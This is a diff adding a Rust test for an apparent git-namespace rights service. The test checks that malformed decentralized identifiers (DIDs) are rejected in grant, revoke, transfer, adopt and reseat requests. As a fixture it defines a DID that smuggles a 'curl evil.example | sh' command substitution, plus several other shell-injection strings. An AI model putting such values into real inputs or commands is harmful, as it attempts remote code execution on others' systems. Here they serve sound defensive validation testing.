@@ -4114,3 +4114,82 @@ async fn an_event_with_a_drift_item_outside_its_namespace_applies_nothing() {
     let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
     assert_eq!(snap.repo_at(RES).unwrap().state, RepoState::Active);
 }
+
+// ── hardening: DIDs are DID-core, stricter than the schema's pattern ────────
+
+/// A "DID" the `git-ns/_shared` `Did` pattern (`^did:[a-z0-9]+:\S+$`)
+/// admits, and a shell would run.
+const SHELL_DID: &str = "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)";
+
+#[tokio::test]
+async fn every_git_ns_task_that_takes_a_did_refuses_one_that_is_not_did_core() {
+    let f = fixture_with(GitNsConfig {
+        elevated_requires_admin: false,
+        ..GitNsConfig::default()
+    })
+    .await;
+    let res = active_repo(&f).await;
+    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
+    let ns = snap.repo_at(&res).unwrap().namespace_id.clone();
+    let cases: Vec<(&Party, &str, Value)> = vec![
+        (
+            &f.bob,
+            "right/grant",
+            json!({ "subject": SHELL_DID, "right": "git.commit.sign", "resource": res }),
+        ),
+        (
+            &f.bob,
+            "right/revoke",
+            json!({ "subject": SHELL_DID, "right": "git.commit.sign", "resource": res }),
+        ),
+        (
+            &f.bob,
+            "repo/transfer",
+            json!({ "resource": res, "to": SHELL_DID }),
+        ),
+        (
+            &f.admin,
+            "repo/adopt",
+            json!({ "resource": "github.com/acme/gadgets", "owners": [f.carol.did, SHELL_DID] }),
+        ),
+        (
+            &f.admin,
+            "namespace/reseat",
+            json!({ "namespace": ns, "subject": SHELL_DID, "statement": "x" }),
+        ),
+    ];
+    for (who, task, payload) in cases {
+        let out = send(&f.vtc.state, who, task, payload).await;
+        assert_eq!(code(&out), "malformedRequest", "{task}");
+    }
+    // Nothing was recorded for it anywhere.
+    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
+    assert!(
+        snap.rights
+            .values()
+            .flat_map(|s| s.rows.iter())
+            .all(|r| r.subject != SHELL_DID)
+    );
+    assert!(snap.repo_at("github.com/acme/gadgets").is_none());
+
+    // Other shapes the schema pattern lets through.
+    for bad in [
+        "did:web:x;id",
+        "did:web:x|sh",
+        "did:web:x`id`",
+        "did:web:x#key-1",
+        "did:web:x?q=1",
+        "did:web:x/p",
+        "did:web:x%zz",
+        "did:web:x:",
+    ] {
+        let out = grant(&f, &f.bob, bad, "git.commit.sign", &res).await;
+        assert!(
+            matches!(code(&out).as_str(), "malformedRequest"),
+            "{bad}: {}",
+            String::from_utf8_lossy(&out.body)
+        );
+    }
+    // A DID-core DID is still accepted.
+    ok(&grant(&f, &f.bob, &f.carol.did, "git.commit.sign", &res).await);
+}
